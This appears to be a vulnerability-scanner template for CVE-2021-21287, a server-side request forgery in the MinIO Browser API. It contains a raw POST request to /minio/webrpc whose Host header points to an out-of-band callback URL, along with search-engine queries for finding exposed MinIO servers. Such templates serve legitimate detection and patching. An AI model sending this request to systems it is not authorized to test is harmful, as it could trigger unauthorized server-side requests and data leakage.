http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - type: word
    words:
    - We encountered an internal error
  matchers-condition: and
  raw:
  - 'POST /minio/webrpc HTTP/1.1

    Host: {{interactsh-url}}

    Content-Type: application/json

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36
    (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36

    Content-Length: 76


    {"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}

    '
id: CVE-2021-21287
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:minio:minio:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-21287
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 7.7
    cwe-id: CWE-918
    epss-percentile: 0.99681
    epss-score: 0.91999
  description: MinIO Browser API before version RELEASE.2021-01-30T00-20-58Z contains
    a server-side request forgery vulnerability.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    make arbitrary requests on behalf of the server, potentially leading to unauthorized
    access or data leakage.

    '
  metadata:
    fofa-query:
    - title="minio console"
    - app="minio"
    - title="minio browser"
    google-query:
    - intitle:"minio browser"
    - intitle:"minio console"
    max-request: 1
    product: minio
    shodan-query:
    - http.title:"minio browser"
    - cpe:"cpe:2.3:a:minio:minio"
    - http.title:"minio console"
    vendor: minio
  name: MinIO Browser API - Server-Side Request Forgery
  reference:
  - https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q
  - https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html
  - https://github.com/minio/minio/pull/11337
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21287
  - https://github.com/minio/minio/commit/eb6871ecd960d570f70698877209e6db181bf276
  remediation: 'Apply the latest security patches or updates provided by MinIO to
    fix this vulnerability.

    '
  severity: high
  tags: cve,cve2021,minio,ssrf,oast,vuln
